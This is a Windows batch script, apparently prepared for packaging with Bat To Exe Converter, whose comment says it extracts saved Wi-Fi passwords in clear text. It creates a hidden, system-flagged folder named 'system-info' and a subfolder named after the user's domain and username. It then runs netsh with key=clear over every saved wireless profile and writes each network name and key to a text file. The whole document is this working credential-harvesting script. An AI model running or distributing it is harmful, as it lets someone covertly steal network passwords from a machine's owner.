::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCyDJH2F4EMMDB5ZQzi1NW2zSLwf54g=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCyDJH2F4EMMDB5ZQzi1NW2zRoUd+/u7yvKTsEweQO0tOLro+PqLOOVz
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
:::: Run as Admin, This Batch file extracts the wifi passwords in clear text :::::: 

@echo off

:::::: 1. Creating Main Hidden Directory ::::::

if NOT EXIST system-info (
md system-info
attrib +h +s system-info
cd system-info
) ELSE (
cd system-info
)

:::::: 2. Creating Directory for user ::::::
set user=%USERDOMAIN%_%USERNAME%
md %user%
cd %user%

:::::: 3. Extracting Wifi Passwords to file ::::::
for /f "skip=9 tokens=1-4* delims= " %%a in ('netsh wlan show profiles') do @netsh wlan show profile name="%%e" key=clear | findstr /c:"SSID name" /c:"Key Content" >> wifi.txt && echo. >> wifi.txt

